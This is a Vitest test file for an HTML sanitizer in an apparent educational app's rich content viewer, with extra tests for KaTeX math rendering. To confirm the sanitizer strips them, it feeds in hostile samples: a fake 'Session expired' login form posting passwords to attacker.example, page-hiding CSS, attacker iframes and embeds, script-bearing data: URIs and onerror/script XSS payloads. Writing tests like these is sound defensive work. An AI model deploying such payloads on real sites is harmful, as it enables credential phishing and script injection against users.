import { describe, it, expect } from 'vitest';
import { sanitizeHTML, renderMathInElement } from '../RichContentViewer';

describe('sanitizeHTML hardening (B002)', () => {
  it('drops <style>, <form> and form* attributes from student HTML', () => {
    const out = sanitizeHTML(
      '<p>.</p><style>body *{visibility:hidden}</style>'
      + '<form action="https://attacker.example/x"><input name="password" placeholder="Session expired">'
      + '<button formaction="https://attacker.example/x">Log in</button></form>',
    );
    expect(out).not.toContain('<style');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('formaction');
    expect(out).not.toContain('attacker.example');
    // Remaining controls are inert.
    expect(out).toMatch(/<input[^>]*disabled/);
    expect(out).toMatch(/<button[^>]*disabled/);
  });

  it('keeps iframes only from trusted media hosts', () => {
    expect(sanitizeHTML('<iframe src="https://www.youtube.com/embed/abc123XYZ"></iframe>'))
      .toContain('src="https://www.youtube.com/embed/abc123XYZ"');
    expect(sanitizeHTML('<p>x</p><iframe src="https://attacker.example/login"></iframe>'))
      .not.toContain('iframe');
    expect(sanitizeHTML('<iframe src="data:text/html,<p>hi</p>"></iframe>')).not.toContain('iframe');
  });

  it('removes plugin embeds', () => {
    const out = sanitizeHTML('<object data="https://attacker.example/x.html"></object><embed src="https://attacker.example/x.swf">');
    expect(out).not.toContain('object');
    expect(out).not.toContain('embed');
  });

  it('limits data: URIs to images', () => {
    expect(sanitizeHTML('<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">')).toContain('data:image/png');
    expect(sanitizeHTML('<a href="data:text/html,<script>alert(1)</script>">x</a>')).not.toContain('data:text');
  });

  it('strips fixed positioning used to overlay the app', () => {
    const out = sanitizeHTML('<div style="position: fixed; inset: 0; color: red">x</div>');
    expect(out).not.toContain('fixed');
    expect(out).toContain('color: red');
  });

  it('still strips inline handlers and scripts', () => {
    const out = sanitizeHTML('<img src=x onerror="alert(1)"><script>alert(2)</script><p>ok</p>');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('<script');
    expect(out).toContain('<p>ok</p>');
  });
});

describe('renderMathInElement (B007)', () => {
  it('renders \\( \\) delimiters and math-tex spans with KaTeX', () => {
    const el = document.createElement('div');
    el.innerHTML = sanitizeHTML('<p>Solve \\(x^2 = 4\\)</p><span class="math-tex">\\(\\frac{1}{2}\\)</span>');
    renderMathInElement(el);
    expect(el.querySelectorAll('.katex').length).toBe(2);
    expect(el.textContent).not.toContain('\\(');
  });

  it('leaves code samples alone', () => {
    const el = document.createElement('div');
    el.innerHTML = '<code>\\(not math\\)</code>';
    renderMathInElement(el);
    expect(el.querySelector('.katex')).toBeNull();
  });
});
